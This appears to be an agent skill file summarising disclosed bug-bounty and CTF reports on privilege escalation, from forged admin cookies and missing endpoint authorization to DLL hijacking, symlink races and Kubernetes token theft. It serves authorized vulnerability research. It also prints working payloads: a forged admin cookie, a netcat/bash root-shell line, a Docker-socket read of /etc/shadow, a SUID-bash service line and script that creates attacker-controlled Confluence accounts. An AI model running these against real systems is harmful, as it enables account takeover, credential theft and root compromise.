---
name: hunter-l3-privilege-escalation
description: "Use when hunting Privilege Escalation on a target. Loads the L3 technique sheet: This class covers any scenario where an attacker gains capabilities beyond what their assigned role, permission scope, or OS privilege level allows — from forging an `admin` flag in a client-side sess"
domain: cybersecurity
subdomain: web
tags:
- web
- privilege-escalation
- hunting
- l3
version: '1.0'
---

# Privilege Escalation — Technique Sheet

## Overview
This class covers any scenario where an attacker gains capabilities beyond what their assigned role, permission scope, or OS privilege level allows — from forging an `admin` flag in a client-side session cookie, to exploiting missing server-side authorization on one privileged endpoint, to local OS escalation via DLL hijacking, symlink races, and insecure filesystem permissions. It pays everywhere: web app logic flaws (Stripe, Shopify, GitLab, Lark, Nextcloud, HackerOne) yield direct account/tenant takeover, while desktop/package and runtime flaws (Acronis, NordVPN, Node.js, Kubernetes, Airflow) yield SYSTEM/root/cluster-admin. The unifying root cause across nearly all records is trust placed in something the attacker controls: a client-held flag, a parameter that changes privilege context, a writable path, or a check performed once and never re-validated.

## Distinct sub-patterns

### 1. Unsigned client-trusted session cookie / admin flag
- Endpoint/param: `POST /secure-login`, cookie parameter `securelogin`.
- Payload (verbatim, base64 JSON): `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==` — decodes to `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}`.
- Root cause: session state serialized as unauthenticated base64 JSON with an `admin` field the server blindly trusts; no signature (HMAC/JWT sig) and no server-side session lookup.
- Impact: admin-only content accessible (`my_secure_files_not_for_you.zip`), zip cracked, flag read.
- Exemplars: 1066203, 1066504 (Stripe CTF), 1068880, 1068934 (h1-ctf).

### 2. Fixed-width record overflow via numeric scientific notation (is_numeric/intval/strlen inconsistency)
- Endpoint/param: `POST /signup-manager/`, params `username,password,age,firstname,lastname`.
- Payload (verbatim): `action=signup&username=lumi&password=nougatzzz&age=1e3&firstname=lumi&lastname=AAAAAAAAAAAAAAY` (variants: `age=1e5`, `1e6`, `1e9` with Y-padded firstname/lastname; e.g. `age=1e9&firstname=YYYYYYYYYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYYYYYYYYY`).
- Root cause: PHP `is_numeric` accepts `1e3`; `intval('1e3')` = 1000 (6 chars vs 3), and `strlen` logic assumed the pre-expansion length — the stored fixed-width line (113 chars) overflows so a `Y` in `lastname` lands at the admin-flag position (char 113).
- Impact: self-registered account created with admin flag set; login as admin; flag `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`.
- Exemplars: 1066203, 1066504, 1066851, 1067037, 1069039 (Reddit CTF program).

### 3. Missing authorization on a single privileged endpoint (direct URL / parameter access)
- Endpoint shapes:
  - `POST /users/create_admin` (Stocky/Shopify) — non-privileged staff POSTs the standard form (`utf8=%E2%9C%93&authenticity_token=[TOKEN]&user[email]=...`) and self-creates an admin (1245736).
  - `GET https://themes.shopify.com/services/v2/themes/submission/new` — staff with only 'Manage public listings' reach the theme-submission page and upload a theme version (1550400).
  - Lark staff group settings — invited admins with only Company Info permission modify all-staff group settings (1021460).
  - Logitech `GET /dashboard#/settings/api-settings` — "admin" restriction is front-end hide only; invited Administrator refreshes the *owner's* API token (1174527).
- Root cause: menu hiding / UI gating without server-side permission re-check on the actual endpoint.
- Impact: full admin, owner-level token rotation, unauthorized publishing.

### 4. Over-privileged GraphQL mutations / API actions
- Endpoint shape: `POST /{num}/stores/api` (Shopify GraphQL), mutations `convertUsersFromSaml`/`convertUsersToSaml`.
- Payload (verbatim): `{"query":"mutation{convertUsersToSaml(userIds:[\"REPLACE_ME\"]){userErrors{message}}}"}`.
- Root cause: mutation callable with Store Management permission instead of requiring User Management.
- Impact: low-priv user links/unlinks users from the SAML IdP — can lock victims out of login entirely.
- Exemplar: 1084904.

### 5. Parameter-controlled privilege context switch
- Shapes:
  - Moneybird `POST /oauth` — change the `administration id` POST param to an administration with only limited access; full permissions granted (135989).
  - GitLab `POST /{namespace}/{project}/-/issues`, param `issue[issue_type]` — payload verbatim: `issue[issue_type]=test_case`; Guest-role user creates a test case (Reporter+ required) by flipping `issue` → `test_case` (1113289).
  - GitLab issue "Move to" — moving an issue carrying a design into a private project did not re-check destination permissions; Reporter uploads Design Management files (1112297).
  - Slack file upload to private IM — only the `channel` (IM channel id) is checked, not participant membership; upload with another member's IM channel id delivers files into their private chat (143903).
- Root cause: privilege decision bound to a mutable parameter or one-time action rather than re-derived from current user/role/destination.

### 6. Stale-permission / revocation failures
- HackerOne `PUT /activities/{num}`:
  - Read-only user PUTs `{"id":812406,...,"type":"Activities::SwagAwarded","message":"pieeeeeee lololololololo",...}` — HTTP 200, content changed (118731).
  - After team access revoked, member can still edit internal comments: PUT `{"id":815794,"is_internal":true,"type":"Activities::Comment",...}` returned 200 (119221).
- Mattermost `POST /channels/{channel_id}/posts`: replay a captured post request after the channel was set read-only — server never re-validates (1114617).
- Nextcloud DAV calendar: group member with edit share can unshare the calendar from other users and remove group permissions (174896).
- Root cause: permission checked at grant time; revoke/downgrade paths don't invalidate existing capabilities or replayed requests.

### 7. Token/scope self-modification
- Endpoint: `PUT /settings/personal/authtokens/{num}` (Nextcloud), body `{"scope":"filesystem:write"}`.
- Root cause: app token can modify/delete app tokens (including its own scope) without full login; token IDs enumerable, no rate limiting.
- Impact: filesystem-scoped token escalates itself back to full filesystem access — scoped-token model defeated.
- Exemplar: 1193321.

### 8. Credential/secret leakage via serialized or logged privileged data
- GitLab `GET /{account}/{repo}/download_export` — project export serializes team members' `authentication_token` into `project.json` unredacted; attacker invites an admin as team member, exports, extracts the admin token (`ZyhqJr4XJZ...`), gains admin panel → RCE (158330).
- Phabricator — password reset links written to daemon logs when mail is disrupted; read admin reset link from logs, reset admin, self-upgrade to Admin (16392).
- Kubernetes ingress-nginx — see sub-pattern 12 for token exfil via snippets/alias injection.

### 9. Self-approval / tenant-boundary bypass (SaaS workflows)
- Lark app approval: non-privileged user approves their own app in the tenant, bypassing admin approval → mass privilege escalation (1168475).
- Lark `open.larksuite.com`: escalation letting an attacker join *any* tenant and view members' files and communications (1363185).
- Nextcloud external storage: mounts keyed only by name — non-priv user creates a same-named mount (`localstrg` payload) and shares it, shadowing the admin's mount so victims see attacker files (165229).
- Nextcloud share/unshare: re-sharing a folder back to the owner then unsharing deletes the original folder — destructive action without authorization (166581).

### 10. Windows local privilege escalation — DLL hijacking via user-writable PATH
- Shapes (Acronis suite): `aszbrowsehelper.exe` loading `tcmalloc.dll` from `%USERPROFILE%\AppData\Local\Microsoft\WindowsApps` (1004740); `report_sender.exe` loading `ubsec.dll` (1008427); `MediaBuilder.exe` loading `tcmalloc.dll` (1010552); MSI repair hijack — `msiexec /fa C:\Windows\Installer\<installer>.msi` drops `schedule.dll` into world-writable `%TEMP%`, replace it before elevated MsiExec loads it (1071832).
- Root cause: elevated processes resolve missing DLLs through the untrusted search order including user-writable PATH dirs (WindowsApps is in User PATH), with no path/authenticode restriction.
- Impact: code exec as Administrator, escalated to `NT AUTHORITY\SYSTEM` via `schtasks`.
- Related GlassWire: `GlassWireSetup.exe` invokes `CertUtil.exe` unqualified — trojaned CertUtil.exe in the user's Downloads folder executes during setup (107213).
- Related Node.js: installer dir `C:\tools` writable by BUILTIN\Users and on system PATH — drop malicious `npm.exe` (Windows prefers .exe over .cmd); runs with privileged user's rights (1211160).

### 11. Windows LPE — writable privileged file paths / symlinks / unquoted service paths
- Unquoted service path: Acronis Nonstop Backup service `afcdpsrv.exe` path unquoted with spaces — payload `C:\Program Files (x86)\Common.exe` executed as SYSTEM on restart; created an Administrator user (1083532).
- Symlinked log write: updater writes `%temp%\Acronis\DriverSetup\inst.log` as SYSTEM — payload `CreateSymlink %temp%\Acronis\DriverSetup\inst.log C:\Windows\System32\drivers\pci.sys` overwrites the driver (1088549→1075449).
- Symlink + rename vs anti-ransomware: rename monitored folder then `CreateSymlink %userprofile%\Desktop\backup_acronis\poc_full_b1_s1_v1.tib C:\Windows\System32\drivers\pci.sys`; "Delete entirely" deletes the protected system file (1003007).
- TOCTOU on SUID validation: macOS SUID 'Acronis True Image' validates `console` binary without locking it; win the race, swap in attacker `a.out`, root shell via `mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1` (1251464).

### 12. Container orchestration / CI escape to cluster-admin or host root
- Kubernetes EndpointSlice leniency (CVE-2021-25737): create a Service + EndpointSlice with `addresses: [127.0.0.1]` labeled `component: apiserver` to route traffic to host-network services — reached host Fluent Bit admin API (1145044).
- ingress-nginx snippet RCE: annotation `nginx.ingress.kubernetes.io/server-snippet` with `set_by_lua` reading `/run/secrets/kubernetes.io/serviceaccount/token` and serving it at `/token`; or path injection payload `/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa` written into nginx.conf → token at `/gaf/token`; tokens with cluster-admin (flux) → secrets dumped cluster-wide (1249583, 1382919).
- kOps on GCP: pod shell → metadata-service SA token → read state bucket CA material → forge admin certs → cluster-admin → steal master node GCP SA token → create arbitrary compute instances (1842829).
- CI Docker socket: GitLab runner with `/var/run/docker.sock` volume — payload `docker run --rm --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c "cat /host/etc/shadow"` → root on runner host (1417211).

### 13. Linux/macOS package & daemon permission flaws
- NordVPN Debian package ships world-writable systemd/init files — payload verbatim: `ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"` → SUID bash → euid=0 (1218523).
- Airflow umask 0 / world-writable logs: swap a scheduler log for a symlink into the DAGs directory and inject a malicious DAG — code execution as airflow user on restart, CVE-2022-38170 (1690093); 2.5.1 chmod-666 dag logs symlinked to the airflow account's SSH private key, read via webserver — any local account → airflow account (1872682).
- Ubiquiti UniFi Video insecure install-dir ACLs → modify program files → privilege escalation, CVE-2016-6914 (140793).

### 14. Sandboxed-runtime escape (Node.js permission model)
- `process.mainModule.require("os")` — policy checks only `require()`/`import` paths (1747642).
- `process.binding('spawn_sync')` — reaches internal modules, arbitrary code outside policy (CVE-2023-32559) (1946470).
- `crypto.setEngine()` — loads arbitrary OpenSSL native engines despite native addons being disallowed; engine disables the permission model (CVE-2023-30586) (1954535).
- `Module._load()` — requires outside policy.json (CVE-2023-32002) (1960870).
- `fs.renameSync('tools/node_modules/eslint/node_modules/eslint', 'escape')` — renaming a relative symlink redirects it outside the allowed directory and the model follows it (1961655).

### 15. Kernel / verifier memory corruption LPE
- Linux eBPF verifier `scalar32_min_max_or()` 64-vs-32-bit bounds bug (CVE-2020-27194): crafted eBPF socket filter → OOB read/write → reliable root on default Ubuntu/Debian/Fedora kernels 5.8.* (1010340).

### 16. Script injection into privileged sessions (stored/remote JS)
- Uber/Confluence: compromised `GET /wp-content/uploads/adrum.js` loaded by Confluence pages — payload (verbatim, abbreviated):
```js
(function(){
var token=AJS.Meta.get('atl_token');
var x=new XMLHttpRequest();
x.open('POST','/admin/users/docreateuser.action');
x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
x.send('atl_token='+token+'&username=attacker&fullName=foo&email=new@attacker.com&password=new&con...');
```
  Creates a Confluence user with attacker password when an admin visits user management (136531).
- Brave: attacker RSS feed `https://csrf.jp/brave/rss_chrome.php` opened via Brave News launches privileged `chrome://settings/resetProfileSettings` — chrome:// scheme not restricted, SOP bypass (1819668).

### 17. Entitlement bypass (paid/subscription features)
- LinkedIn Learning share feature: non-paying users play subscription-only videos via SHARE (1809633).

## Bypass / chain notes
- Cookie forgery chains: username enumeration (distinct "Invalid Username" error) → hydra/seclists password brute (`access:computer`) → forge `admin:true` cookie → crack zip (`hahahaha`) → flag (1068880/1068934).
- Numeric-overflow chain: obtain leaked source (README.md → signupmanager.zip), read fixed-width record layout offline, then craft `age=1eN` + Y-padding to hit char 113 precisely.
- DLL-hijack chain: plant DLL in WindowsApps → trigger elevated app action → Administrator shell → `schtasks` for SYSTEM (used in three separate Acronis reports).
- Symlink chains consistently: delete/recreate a directory or file the privileged process writes to, `CreateSymlink` (or ln -s) to a privileged target, trigger the operation. Works against logs, installers, anti-ransomware-monitored files.
- Cloud chain: pod shell → metadata service token → object-storage state/CA material → forge cluster-admin certs → steal node-level cloud SA tokens.
- Front-end-only restrictions: always re-request admin URLs directly with the lower-priv session; never trust the menu.

## Gotchas / what NOT to do
- Don't stop at the UI: Logitech/Lark/Shopify theme-store bugs were all "hidden menu, live endpoint."
- Replay isn't always revoked: a request captured while authorized may still succeed after downgrade (Mattermost) — but on HackerOne, privilege revocation *did* happen eventually; test both immediately and after propagation delays.
- Scientific notation needs a length delta: `1e3` only works if the record layout has exactly the right slack; read the source first (all successful reports did).
- For DLL hijacking, the DLL must be *missing* from the app's directory and resolvable via user-writable PATH — planting next to the exe in `C:\Program Files` won't be writable; WindowsApps/Downloads/%TEMP% are the vectors seen.
- Symlink races need correct trigger timing (MSI repair, service restart, scheduler restart); Airflow cases required controlling umask/666 conditions — verify pre-conditions before claiming.
- Node policy escapes: test the *unlisted* paths — `mainModule.require`, `process.binding`, `Module._load`, `crypto.setEngine`, symlink renames — not plain `require`, which the policy does cover.
- Impact framing matters: SAML unlinking (Shopify) and mount-shadowing (Nextcloud) were accepted as serious because of denial-of-access/data-integrity framing, not just "low-priv can call X."

## Real-world impact examples
- SYSTEM: Acronis DLL hijacks escalated from unprivileged user to `NT AUTHORITY\SYSTEM` (1004740, 1008427, 1010552, 1071832); unquoted service path created an Administrator account (1083532).
- Root: NordVPN SUID bash (1218523); Acronis macOS TOCTOU root shell (1251464); eBPF verifier kernel root across default distro kernels (1010340).
- cluster-admin + cloud compromise: kOps GCP chain reached cluster-admin and arbitrary compute-instance creation (1842829); ingress-nginx token theft dumped secrets in all namespaces (1249583, 1382919); GitLab CI runner root via docker.sock (1417211).
- Admin panel + RCE: GitLab export token leak gave admin panel access leading to RCE and all private-repo code (158330); BuddyPress REST missing authz → admin → RCE (1107282).
- Tenant/account takeover: Lark join-any-tenant (1363185), self-approved apps (1168475), Moneybird full administration access via OAuth param (135989); Shopify SAML unlinking could lock users out of the org (1084904).